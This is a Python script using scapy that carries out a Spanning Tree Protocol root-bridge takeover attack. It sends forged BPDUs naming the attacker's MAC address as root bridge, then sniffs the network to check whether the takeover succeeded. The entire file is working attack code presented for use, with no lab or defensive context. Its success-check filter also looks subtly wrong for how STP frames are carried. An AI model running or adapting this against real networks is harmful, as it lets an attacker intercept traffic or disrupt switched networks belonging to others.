import time
from scapy.all import sendp, sniff, conf
from scapy.layers.l2 import Ether, LLC, STP
from scapy.all import get_if_hwaddr


class STPAttack:
    def __init__(self, interface, num_packets, priority):
        self.interface = interface
        self.num_packets = num_packets
        self.priority = priority
        self.attacker_mac = get_if_hwaddr(self.interface)

    def stp_attack(self):
        for _ in range(self.num_packets):
            ethernet = Ether(src=self.attacker_mac, dst="01:80:c2:00:00:00")
            llc = LLC(dsap=0x42, ssap=0x42, ctrl=3)
            stp = STP(rootid=self.priority, rootmac=self.attacker_mac, bridgeid=self.priority,
                      bridgemac=self.attacker_mac)

            packet = ethernet / llc / stp
            sendp(packet, iface=self.interface, verbose=False)

    def stp_packet_filter(self, packet):
        return packet.haslayer(STP)

    def check_attack_success(self, timeout):
        def check_root(packet):
            return packet[STP].rootmac == self.attacker_mac


        packets = sniff(iface=self.interface, filter="ether proto 0x010B", timeout=timeout, stop_filter=check_root)

        return any(p[STP].rootmac == self.attacker_mac for p in packets)
        
    def run(self):
        self.stp_attack()
        time.sleep(5)  # Give some time for the network to converge
        success = self.check_attack_success(timeout=10)

        if success:
            return True
        else:
            return False


